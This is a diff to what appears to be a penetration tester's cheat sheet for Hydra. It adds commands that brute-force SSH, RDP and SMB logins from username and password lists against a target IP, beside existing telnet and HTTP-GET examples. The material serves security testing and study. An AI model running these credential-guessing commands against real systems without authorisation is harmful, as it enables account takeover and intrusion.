@@ -26,6 +26,15 @@ hydra -U rdp
 # Attack a telnet service
 hydra -L users.txt -P pass.txt telnet://target.server  
 
+# Attack a ssh service
+hydra -L user.list -P password.list ssh://$ip
+
+# Attack 3389 RDP
+hydra -L user.list -P password.list rdp://$ip
+
+# Attack samba
+hydra -L user.list -P password.list smb://$ip
+
 # Attack a web resource
 hydra -L users-txt -P pass.txt http-get://localhost/   
 # -l: specify login name
